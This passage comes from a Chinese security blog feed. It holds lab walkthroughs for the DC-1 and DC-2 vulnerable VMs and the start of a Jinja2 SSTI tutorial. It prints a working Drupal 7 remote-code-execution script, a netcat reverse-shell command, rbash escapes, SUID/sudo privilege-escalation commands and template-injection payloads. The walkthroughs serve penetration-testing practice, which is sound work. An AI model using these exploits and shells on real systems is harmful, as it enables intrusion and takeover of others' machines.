src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220181019773.png" alt="image-20211220181019773"></p><p>返回上一级目录，发现jerry和tom</p><p>在jerry里面找到了flag4.txt</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220181211673.png" alt="image-20211220181211673"></p><pre><code>vi flag4.txt</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220181341437.png" alt="image-20211220181341437"></p><pre><code>Good to see that you&#39;ve made it this far - but you&#39;re not home yet.You still need to get the final flag (the only flag that really counts!!!).No hints here - you&#39;re on your own now.  :-)Go on - git outta here!!!!</code></pre><p>从<code>but you&#39;re not home yet.</code>可知，我们下一步要去到root目录</p><p>但是没有访问权限</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220182133205.png" alt="image-20211220182133205"></p><p>还需要进一步提权</p><p>用jerry的账号登录看看，有啥可以用的命令，结果登录不上</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220183011255.png" alt="image-20211220183011255"></p><p>只能回到tom的账号</p><p>现在主要是<code>rbash</code>限制了我们的操作，如果能绕过就好了</p><p>百度走一波，找到rbash的绕过方法，步骤如下：</p><p>在刚才的部分提权成功的基础上，在进行下面的命令</p><pre><code>export PATH=/usr/sbin:/usr/bin:/sbin:/bin  //配置环境变量，成功绕过shell</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220192344498.png" alt="image-20211220192344498"></p><p>这里已经绕过了rbash了,很多常用的命令可以用了</p><p>或者用这个方法:</p><pre><code>BASH_CMDS[a]=/bin/sh;a  注：把/bin/bash给a变量`export PATH=$PATH:/bin/    注：将/bin 作为PATH环境变量导出export PATH=$PATH:/usr/bin   注：将/usr/bin作为PATH环境变量导出</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220193814982.png" alt="image-20211220193814982"></p><h2 id="提权："><a href="#提权：" class="headerlink" title="提权："></a>提权：</h2><p>这里尝试用suid提权:利用拥有suid的文件执行命令，从而提升权限至root</p><p>先查看有哪些可以利用的命令：</p><pre><code>find / -perm -u=s -type f 2&gt;/dev/null</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220194330547.png" alt="image-20211220194330547"></p><p>发现有sudo和su，看看有sudo权限的</p><pre><code>sudo -l</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220194650691.png" alt="image-20211220194650691"></p><p>这一波，只能说是意料之中的，要不然jerry这个用户就没啥用了，</p><p>切换到jerry这个用户</p><pre><code>su jerry</code></pre><p>然后</p><pre><code>sudo -l</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220195945974.png" alt="image-20211220195945974"></p><p>可以看到可以用root执行git</p><p>用git提权：</p><pre><code>sudo git help config进入页面后输入!/bin/bash</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220200157116.png" alt="image-20211220200157116"></p><p>提权成功</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220200330185.png" alt="image-20211220200330185"></p><p>找flag</p><p>进入root，里面有个final-flag.txt</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220200535155.png" alt="image-20211220200535155"></p><p>完美结束！</p>]]></content>
      
      
      
        <tags>
            
            <tag> DC靶场系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-1靶场练习</title>
      <link href="/2021/12/19/DC-1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
      <url>/2021/12/19/DC-1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="DC-1靶场练习"><a href="#DC-1靶场练习" class="headerlink" title="DC-1靶场练习"></a>DC-1靶场练习</h1><h2 id="练习环境"><a href="#练习环境" class="headerlink" title="练习环境"></a>练习环境</h2><p>kali:192.168.10.128</p><p>靶机:未知</p><p>两个虚拟机都使用桥接(为了方便)</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>先用kali扫描域内存活的主机</p><pre><code>nmap 192.168.10.0/24</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219161524442.png" alt="image-20211219161524442"></p><p>扫描到靶机，获得以下信息：</p><ul><li><p>靶机IP:192.168.10.100</p></li><li><p>开放端口: 22(ssh),80(http),111(rpcbind)</p></li></ul><p>先从80端口入手,浏览器打开</p><pre><code>http://192.168.10.100</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219161912348.png" alt="image-20211219161912348"></p><p>使用Wappalyzer查看信息</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219162152997.png" alt="image-20211219162152997"></p><p>可以看到这个网站的cms是<code>Drupal 7</code></p><p>然后就出于本能的去搜索一下这个版本的CMS的漏洞</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219162454136.png" alt="image-20211219162454136"></p><p>经过一番查找，得到该漏洞的交互式命令执行python3脚本：</p><pre><code>import requestsimport refrom sys import argvdomain = argv[1]def exploit(command):    HOST=domain    get_params = &#123;&#39;q&#39;:&#39;user/password&#39;, &#39;name[#post_render][]&#39;:&#39;passthru&#39;, &#39;name[#markup]&#39;:command, &#39;name[#type]&#39;:&#39;markup&#39;&#125;    post_params = &#123;&#39;form_id&#39;:&#39;user_pass&#39;, &#39;_triggering_element_name&#39;:&#39;name&#39;&#125;    r = requests.post(HOST, data=post_params, params=get_params)    m = re.search(r&#39;&lt;input type=&quot;hidden&quot; name=&quot;form_build_id&quot; value=&quot;([^&quot;]+)&quot; /&gt;&#39;, r.text)    if m:        found = m.group(1)        get_params = &#123;&#39;q&#39;:&#39;file/ajax/name/#value/&#39; + found&#125;        post_params = &#123;&#39;form_build_id&#39;:found&#125;        r = requests.post(HOST, data=post_params, params=get_params)        print(&quot;\n&quot;.join(r.text.split(&quot;\n&quot;)[:-1]))while True:    command = input(&#39;$ &#39;)    exploit(command)</code></pre><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>先尝试用这个脚本，将代码保存在rce.py中</p><pre><code>python3 rce.py http://192.168.10.100/</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219163714876.png" alt="image-20211219163714876"></p><p>脚本很强，可以使用，直getshell了，但是使用起来不方便</p><p>尝试在msfconsole中查找脚本</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219164042118.png" alt="image-20211219164042118"></p><p>找到8个，并且<code>exploit/multi/http/drupal_drupageddon </code>的和http有关，应该是这个了</p><p>设置好配置后尝试攻击</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219164634308.png" alt="image-20211219164634308"></p><p>攻击成功</p><p>尝试获取反弹shell</p><pre><code>kali：nc -lvvp 1234 靶机 ：nc -e /bin/bash 192.168.10.128 1234kali：python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219165140933.png" alt="image-20211219165140933"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219165153578.png" alt="image-20211219165153578"></p><p>反弹成功</p><p>先查看文件一下</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219165247700.png" alt="image-20211219165247700"></p><p>这里有一个flag1.txt,<code>cat flag1.txt</code>查看</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219165548731.png" alt="image-20211219165548731"></p><p>翻译一下：</p><p>“每个好的 CMS 都需要一个配置文件 - 你也是。”</p><p>百度查找一下这个CMS的配置文件名字</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219165833472.png" alt="image-20211219165833472"></p><p>路径都查出来了，直接查看settings.php</p><pre><code>cat sites/default/settings.php</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219170147768.png" alt="image-20211219170147768"></p><p>拿到了flag2,并且得到数据库信息</p><p>flag2的翻译：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219170326017.png" alt="image-20211219170326017"></p><p>我不懂作者要表达啥，但我知道要提权</p><p>根据上面信息，尝试连接数据库</p><pre><code>mysql -udbuser -pR0ck3t</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219172022853.png" alt="image-20211219172022853"></p><p>连接成功，查看数据库</p><pre><code>show databases;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219172120533.png" alt="image-20211219172120533"></p><p>选定数据库drupaldb</p><pre><code>use drupaldb;</code></pre><p>查看这个数据库的表</p><pre><code>show tables;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219172403487.png" alt="image-20211219172403487"></p><p>查询到敏感表<code>users</code>,查看里面的信息</p><pre><code>select *from users;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219172655690.png" alt="image-20211219172655690"></p><p>可以看到admin的账号密码，密码被hash加密过,这里有两种选择，要么爆破，要么改数据库里的密码</p><p>由flag2提示，爆破这条路似乎走不通，只能修改密码</p><p>首先要找到它的加密脚本丢在哪里，百度一下得知脚本名称为<code>password-hash.sh</code>,然后查找一下</p><pre><code>find / -name password-hash.sh</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219174428472.png" alt="image-20211219174428472"></p><p>得到路径: &#x2F;var&#x2F;www&#x2F;scripts&#x2F;password-hash.sh</p><p>使用drupal 自带脚本重新生成加密后的密码,这里打算把密码改为admin</p><pre><code>./scripts/password-hash.sh admin</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219175317713.png" alt="image-20211219175317713"></p><p>得到加密后的密码;</p><pre><code>$S$DDEzmVGyUponhBeWCHBORSLh8X/MX1k0dnHdjF2QG8eq3IDaugr6</code></pre><p>回到mysql修改admin密码</p><pre><code>update users set pass=&#39;$S$DDEzmVGyUponhBeWCHBORSLh8X/MX1k0dnHdjF2QG8eq3IDaugr6&#39; where uid=1;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219175635384.png" alt="image-20211219175635384"></p><p>密码修改成功</p><p>来到后台尝试登录</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219175851595.png" alt="image-20211219175851595"></p><p>登录成功，并且得到flag3</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219175949955.png" alt="image-20211219175949955"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219180031924.png" alt="image-20211219180031924"></p><p>翻译一下：</p><p><code>特殊的PERMS 将帮助查找passwd——但您需要-exec 该命令来确定如何获取shadow中的内容。</code></p><p>根据提示，查看&#x2F;etc&#x2F;passwd：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219200505179.png" alt="image-20211219200505179"></p><p>这里可以看到有个flag4用户，并且知道flag4路径，还有bash</p><p>查看&#x2F;etc&#x2F;shadow：权限不够</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219200613083.png" alt="image-20211219200613083"></p><p>先查看flag4内容</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219180624886.png" alt="image-20211219180624886"></p><pre><code>Can you use this same method to find or access the flag in root?您可以使用相同的方法在 root 中查找或访问flag吗？Probably. But perhaps it&#39;s not that easy.  Or maybe it is?大概。 但也许没那么容易。 或者也许是？</code></pre><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>liunx提权一般有四种提权方式：</p><ul><li><p>sudo提权，通过命令<code>sudo -l</code>查看是否有可提权的命令。</p></li><li><p>suid提权，通过命令<code>find / -perm -4000 2&gt;/dev/null</code>查看是否具有root权限的命令，</p></li><li><p>系统版本内核提权。</p></li><li><p>通过数据库提权。</p></li></ul><p>先列出来以root权限执行的文件</p><pre><code>find / -perm -4000 2&gt;/dev/null</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219204647219.png" alt="image-20211219204647219"></p><p>find可以使用</p><p>常见的可以用来提权的文件:</p><pre><code>NmapVimfindBashMoreLessNanocp</code></pre><p>find 命令说明<br>-exec 参数后面跟的是command命令，它的终止是以;为结束标志的，所以这句命令后面的分号是不可缺少的，考虑到各个系统中分号会有不同的意义，所以前面加反斜杠。-exec参数后面跟的就是我们想进一步操作的命令,so，我们可以以root的权限命令执行了。</p><pre><code>//这个要在/var/www下执行touch getflagfind / -type f -name getflag -exec &quot;whoami&quot; \;find / -type f -name getflag -exec &quot;/bin/sh&quot; \;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219210216024.png"></p><p>提权成功，获取root权限</p><p>现在目标就是找最后的flag,最后的flag在root目录下</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219205951044.png"></p><pre><code>Well done!!!!Hopefully you&#39;ve enjoyed this and learned some new skills.You can let me know what you thought of this little journeyby contacting me via Twitter - @DCAU7</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> DC靶场系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssti学习</title>
      <link href="/2021/12/16/ssti%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/12/16/ssti%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="ssti学习"><a href="#ssti学习" class="headerlink" title="ssti学习"></a>ssti学习</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>我这里用了vulhub+docker-compose搭建的环境</p><p>下载好docker、docker-compose和vulhub后，找到ssti对应文件夹，打开终端</p><pre><code>docker-compose builddocker-compose up -d</code></pre><p>然后用浏览器访问本机的8000端口</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211216223957040.png" alt="image-20211216223957040"></p><h2 id="漏洞检验"><a href="#漏洞检验" class="headerlink" title="漏洞检验"></a>漏洞检验</h2><p>页面啥也没有，只能去看看源码了</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211216224756010.png" alt="image-20211216224756010"></p><p>从源码得知，参数是name，用get方法传入参数</p><hr><p>假设没看源码，需要给参数传入一些东西来检验它存不存在ssti</p><p>为了方便，这里用burpsuite抓包</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211216225747049.png" alt="image-20211216225747049"></p><p>传入的是</p><pre><code>?name=&#123;&#123;7*7&#125;&#125;</code></pre><p>页面返回<code>49</code>，说明这里存在ssti漏洞,而且还是jinja2的</p><p><img src="https://p5.ssl.qhimg.com/t01a66955048c86d5b6.png" alt="1"></p><h2 id="漏洞利用套路"><a href="#漏洞利用套路" class="headerlink" title="漏洞利用套路"></a>漏洞利用套路</h2><p>基本思路就是利用 python 中的<code>魔术方法</code>找到自己要用的函数</p><ul><li><p>dict: 保存类实例或对象实例的属性变量键值对字典</p></li><li><p>class: 返回调用的参数类型</p></li><li><p>mro: 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析</p></li><li><p>bases: 返回类型列表</p></li><li><p>subclasses: 返回object的子类</p></li><li><p>init: 类的初始化方法</p></li><li><p>globals: 函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价</p><pre><code>base和 mro都是用来寻找基类的。</code></pre></li></ul><h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p>使用魔术方法进行函数解析，再获取基本类：</p><pre><code>&#39;&#39;.__class__.__mro__[2]&#123;&#125;.__class__.__bases__[0]().__class__.__bases__[0][].__class__.__bases__[0]request.__class__.__mro__[8] //针对jinjia2/flask为[9]适用</code></pre><p><code>[]</code>内的数字不是固定的，这一步主要是找到object类</p><pre><code>?name=&#123;&#123;''.__class__.__mro__&#125;&#125;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211217102722307.png" alt="image-20211217102722307"></p><p>所以第一步用的payload是</p><pre><code>?name=&#123;&#123;''.__class__.__mro__[1]&#125;&#125;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211217102839137.png" alt="image-20211217102839137"></p><h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p>获取基本类后，继续向下获取基本类 object 的子类：</p><pre><code>?name=&#123;&#123;''.__class__.__mro__[1].__subclasses__()&#125;&#125;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211217103214134.png" alt="image-20211217103214134"></p><p>这里得到的东西有点眼花缭乱，但是不要慌，找准目标，什么都好说</p><p>这一步我们要找的是<code>&lt;class &#39;warnings.catch_warnings&#39;&gt;</code>,返回的类太多，很难找到它对应的下标，一个个数，不太现实</p><p>这里写个小小脚本</p><pre><code class="python">str=&quot;&lt;class &#39;type&#39;&gt;, &lt;class &#39;weakref&#39;&gt;, &lt;class &#39;weakcallableproxy&#39;&gt;, &lt;class &#39;weakproxy&#39;&gt;, &lt;class &#39;int&#39;&gt;, &lt;class &#39;bytearray&#39;&gt;, &lt;class &#39;bytes&#39;&gt;, &lt;class &#39;list&#39;&gt;, &lt;class &#39;NoneType&#39;&gt;, &lt;class &#39;NotImplementedType&#39;&gt;, &lt;class &#39;traceback&#39;&gt;, &lt;class &#39;super&#39;&gt;, &lt;class &#39;range&#39;&gt;, &lt;class &#39;dict&#39;&gt;, &lt;class &#39;dict_keys&#39;&gt;, &lt;class &#39;dict_values&#39;&gt;, &lt;class &#39;dict_items&#39;&gt;, &lt;class &#39;odict_iterator&#39;&gt;, &lt;class &#39;set&#39;&gt;, &lt;class &#39;str&#39;&gt;, &lt;class &#39;slice&#39;&gt;, &lt;class &#39;staticmethod&#39;&gt;, &lt;class &#39;complex&#39;&gt;, &lt;class &#39;float&#39;&gt;, &lt;class &#39;frozenset&#39;&gt;, &lt;class &#39;property&#39;&gt;, &lt;class &#39;managedbuffer&#39;&gt;, &lt;class &#39;memoryview&#39;&gt;, &lt;class &#39;tuple&#39;&gt;, &lt;class &#39;enumerate&#39;&gt;, &lt;class &#39;reversed&#39;&gt;, &lt;class &#39;stderrprinter&#39;&gt;, &lt;class &#39;code&#39;&gt;, &lt;class &#39;frame&#39;&gt;, &lt;class &#39;builtin_function_or_method&#39;&gt;, &lt;class &#39;method&#39;&gt;, &lt;class &#39;function&#39;&gt;, &lt;class &#39;mappingproxy&#39;&gt;, &lt;class &#39;generator&#39;&gt;, &lt;class &#39;getset_descriptor&#39;&gt;, &lt;class &#39;wrapper_descriptor&#39;&gt;, &lt;class &#39;method-wrapper&#39;&gt;, &lt;class &#39;ellipsis&#39;&gt;, &lt;class &#39;member_descriptor&#39;&gt;, &lt;class &#39;types.SimpleNamespace&#39;&gt;, &lt;class &#39;PyCapsule&#39;&gt;, &lt;class &#39;longrange_iterator&#39;&gt;, &lt;class &#39;cell&#39;&gt;, &lt;class &#39;instancemethod&#39;&gt;, &lt;class &#39;classmethod_descriptor&#39;&gt;, &lt;class &#39;method_descriptor&#39;&gt;, &lt;class &#39;callable_iterator&#39;&gt;, &lt;class &#39;iterator&#39;&gt;, &lt;class &#39;coroutine&#39;&gt;, &lt;class &#39;coroutine_wrapper&#39;&gt;, &lt;class &#39;EncodingMap&#39;&gt;, &lt;class &#39;fieldnameiterator&#39;&gt;, &lt;class &#39;formatteriterator&#39;&gt;, &lt;class &#39;filter&#39;&gt;, &lt;class &#39;map&#39;&gt;, &lt;class &#39;zip&#39;&gt;, &lt;class &#39;moduledef&#39;&gt;, &lt;class &#39;module&#39;&gt;, &lt;class &#39;BaseException&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt;, &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt;, &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt;, &lt;class &#39;_frozen_importlib.BuiltinImporter&#39;&gt;, &lt;class &#39;classmethod&#39;&gt;, &lt;class &#39;_frozen_importlib.FrozenImporter&#39;&gt;, &lt;class &#39;_frozen_importlib._ImportLockContext&#39;&gt;, &lt;class &#39;_thread._localdummy&#39;&gt;, &lt;class &#39;_thread._local&#39;&gt;, &lt;class &#39;_thread.lock&#39;&gt;, &lt;class &#39;_thread.RLock&#39;&gt;, &lt;class &#39;_frozen_importlib_external.WindowsRegistryFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external._LoaderBasics&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external.PathFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt;, &lt;class &#39;_io._IOBase&#39;&gt;, &lt;class &#39;_io._BytesIOBuffer&#39;&gt;, &lt;class &#39;_io.IncrementalNewlineDecoder&#39;&gt;, &lt;class &#39;posix.ScandirIterator&#39;&gt;, &lt;class &#39;posix.DirEntry&#39;&gt;, &lt;class &#39;zipimport.zipimporter&#39;&gt;, &lt;class &#39;codecs.Codec&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &lt;class &#39;codecs.StreamReaderWriter&#39;&gt;, &lt;class &#39;codecs.StreamRecoder&#39;&gt;, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &lt;class &#39;abc.ABC&#39;&gt;, &lt;class &#39;collections.abc.Hashable&#39;&gt;, &lt;class &#39;collections.abc.Awaitable&#39;&gt;, &lt;class &#39;collections.abc.AsyncIterable&#39;&gt;, &lt;class &#39;async_generator&#39;&gt;, &lt;class &#39;collections.abc.Iterable&#39;&gt;, &lt;class &#39;bytes_iterator&#39;&gt;, &lt;class &#39;bytearray_iterator&#39;&gt;, &lt;class &#39;dict_keyiterator&#39;&gt;, &lt;class &#39;dict_valueiterator&#39;&gt;, &lt;class &#39;dict_itemiterator&#39;&gt;, &lt;class &#39;list_iterator&#39;&gt;, &lt;class &#39;list_reverseiterator&#39;&gt;, &lt;class &#39;range_iterator&#39;&gt;, &lt;class &#39;set_iterator&#39;&gt;, &lt;class &#39;str_iterator&#39;&gt;, &lt;class &#39;tuple_iterator&#39;&gt;, &lt;class &#39;collections.abc.Sized&#39;&gt;, &lt;class &#39;collections.abc.Container&#39;&gt;, &lt;class &#39;collections.abc.Callable&#39;&gt;, &lt;class &#39;os._wrap_close&#39;&gt;, &lt;class &#39;_sitebuiltins.Quitter&#39;&gt;, &lt;class &#39;_sitebuiltins._Printer&#39;&gt;, &lt;class &#39;_sitebuiltins._Helper&#39;&gt;, &lt;class &#39;types.DynamicClassAttribute&#39;&gt;, &lt;class &#39;functools.partial&#39;&gt;, &lt;class &#39;functools._lru_cache_wrapper&#39;&gt;, &lt;class &#39;operator.itemgetter&#39;&gt;, &lt;class &#39;operator.attrgetter&#39;&gt;, &lt;class &#39;operator.methodcaller&#39;&gt;, &lt;class &#39;itertools.accumulate&#39;&gt;, &lt;class &#39;itertools.combinations&#39;&gt;, &lt;class &#39;itertools.combinations_with_replacement&#39;&gt;, &lt;class &#39;itertools.cycle&#39;&gt;, &lt;class &#39;itertools.dropwhile&#39;&gt;, &lt;class &#39;itertools.takewhile&#39;&gt;, &lt;class &#39;itertools.islice&#39;&gt;, &lt;class &#39;itertools.starmap&#39;&gt;, &lt;class &#39;itertools.chain&#39;&gt;, &lt;class &#39;itertools.compress&#39;&gt;, &lt;class &#39;itertools.filterfalse&#39;&gt;, &lt;class &#39;itertools.count&#39;&gt;, &lt;class &#39;itertools.zip_longest&#39;&gt;, &lt;class &#39;itertools.permutations&#39;&gt;, &lt;class &#39;itertools.product&#39;&gt;, &lt;class &#39;itertools.repeat&#39;&gt;, &lt;class &#39;itertools.groupby&#39;&gt;, &lt;class &#39;itertools._grouper&#39;&gt;, &lt;class &#39;itertools._tee&#39;&gt;, &lt;class &#39;itertools._tee_dataobject&#39;&gt;, &lt;class &#39;reprlib.Repr&#39;&gt;, &lt;class &#39;collections.deque&#39;&gt;, &lt;class &#39;_collections._deque_iterator&#39;&gt;, &lt;class &#39;_collections._deque_reverse_iterator&#39;&gt;, &lt;class &#39;collections._Link&#39;&gt;, &lt;class &#39;weakref.finalize._Info&#39;&gt;, &lt;class &#39;weakref.finalize&#39;&gt;, &lt;class &#39;functools.partialmethod&#39;&gt;, &lt;class &#39;types._GeneratorWrapper&#39;&gt;, &lt;class &#39;enum.auto&#39;&gt;, &lt;enum &#39;Enum&#39;&gt;, &lt;class &#39;_sre.SRE_Pattern&#39;&gt;, &lt;class &#39;_sre.SRE_Match&#39;&gt;, &lt;class &#39;_sre.SRE_Scanner&#39;&gt;, &lt;class &#39;sre_parse.Pattern&#39;&gt;, &lt;class &#39;sre_parse.SubPattern&#39;&gt;, &lt;class &#39;sre_parse.Tokenizer&#39;&gt;, &lt;class &#39;re.Scanner&#39;&gt;, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &lt;class &#39;tokenize.Untokenizer&#39;&gt;, &lt;class &#39;traceback.FrameSummary&#39;&gt;, &lt;class &#39;traceback.TracebackException&#39;&gt;, &lt;class &#39;_hashlib.HASH&#39;&gt;, &lt;class &#39;_blake2.blake2b&#39;&gt;, &lt;class &#39;_blake2.blake2s&#39;&gt;, &lt;class &#39;_sha3.sha3_224&#39;&gt;, &lt;class &#39;_sha3.sha3_256&#39;&gt;, &lt;class &#39;_sha3.sha3_384&#39;&gt;, &lt;class &#39;_sha3.sha3_512&#39;&gt;, &lt;class &#39;_sha3.shake_128&#39;&gt;, &lt;class &#39;_sha3.shake_256&#39;&gt;, &lt;class &#39;_random.Random&#39;&gt;, &lt;class &#39;select.poll&#39;&gt;, &lt;class &#39;select.epoll&#39;&gt;, &lt;class &#39;selectors.BaseSelector&#39;&gt;, &lt;class &#39;_socket.socket&#39;&gt;, &lt;class &#39;datetime.date&#39;&gt;, &lt;class &#39;datetime.timedelta&#39;&gt;, &lt;class &#39;datetime.time&#39;&gt;, &lt;class &#39;datetime.tzinfo&#39;&gt;, &lt;class &#39;urllib.parse._ResultMixinStr&#39;&gt;, &lt;class &#39;urllib.parse._ResultMixinBytes&#39;&gt;, &lt;class &#39;urllib.parse._NetlocResultMixinBase&#39;&gt;, &lt;class &#39;calendar._localized_month&#39;&gt;, &lt;class &#39;calendar._localized_day&#39;&gt;, &lt;class &#39;calendar.Calendar&#39;&gt;, &lt;class &#39;calendar.different_locale&#39;&gt;, &lt;class &#39;email._parseaddr.AddrlistClass&#39;&gt;, &lt;class &#39;Struct&#39;&gt;, &lt;class &#39;string.Template&#39;&gt;, &lt;class &#39;string.Formatter&#39;&gt;, &lt;class &#39;email.charset.Charset&#39;&gt;, &lt;class &#39;_ast.AST&#39;&gt;, &lt;class &#39;ast.NodeVisitor&#39;&gt;, &lt;class &#39;dis.Bytecode&#39;&gt;, &lt;class &#39;inspect.BlockFinder&#39;&gt;, &lt;class &#39;inspect._void&#39;&gt;, &lt;class &#39;inspect._empty&#39;&gt;, &lt;class &#39;inspect.Parameter&#39;&gt;, &lt;class &#39;inspect.BoundArguments&#39;&gt;, &lt;class &#39;inspect.Signature&#39;&gt;, &lt;class &#39;threading._RLock&#39;&gt;, &lt;class &#39;threading.Condition&#39;&gt;, &lt;class &#39;threading.Semaphore&#39;&gt;, &lt;class &#39;threading.Event&#39;&gt;, &lt;class &#39;threading.Barrier&#39;&gt;, &lt;class &#39;threading.Thread&#39;&gt;, &lt;class &#39;logging.LogRecord&#39;&gt;, &lt;class &#39;logging.PercentStyle&#39;&gt;, &lt;class &#39;logging.Formatter&#39;&gt;, &lt;class &#39;logging.BufferingFormatter&#39;&gt;, &lt;class &#39;logging.Filter&#39;&gt;, &lt;class &#39;logging.Filterer&#39;&gt;, &lt;class &#39;logging.PlaceHolder&#39;&gt;, &lt;class &#39;logging.Manager&#39;&gt;, &lt;class &#39;logging.LoggerAdapter&#39;&gt;, &lt;class &#39;textwrap.TextWrapper&#39;&gt;, &lt;class &#39;__future__._Feature&#39;&gt;, &lt;class &#39;importlib.abc.Finder&#39;&gt;, &lt;class &#39;importlib.abc.Loader&#39;&gt;, &lt;class &#39;contextlib.ContextDecorator&#39;&gt;, &lt;class &#39;zlib.Compress&#39;&gt;, &lt;class &#39;zlib.Decompress&#39;&gt;, &lt;class &#39;_bz2.BZ2Compressor&#39;&gt;, &lt;class &#39;_bz2.BZ2Decompressor&#39;&gt;, &lt;class &#39;_lzma.LZMACompressor&#39;&gt;, &lt;class &#39;_lzma.LZMADecompressor&#39;&gt;, &lt;class &#39;zipfile.ZipInfo&#39;&gt;, &lt;class &#39;zipfile._ZipDecrypter&#39;&gt;, &lt;class &#39;zipfile.LZMACompressor&#39;&gt;, &lt;class &#39;zipfile.LZMADecompressor&#39;&gt;, &lt;class &#39;zipfile._SharedFile&#39;&gt;, &lt;class &#39;zipfile._Tellable&#39;&gt;, &lt;class &#39;zipfile.ZipFile&#39;&gt;, &lt;class &#39;pkgutil.ImpImporter&#39;&gt;, &lt;class &#39;pkgutil.ImpLoader&#39;&gt;, &lt;class &#39;subprocess.CompletedProcess&#39;&gt;, &lt;class &#39;subprocess.Popen&#39;&gt;, &lt;class &#39;pyexpat.xmlparser&#39;&gt;, &lt;class &#39;plistlib.Data&#39;&gt;, &lt;class &#39;plistlib._PlistParser&#39;&gt;, &lt;class 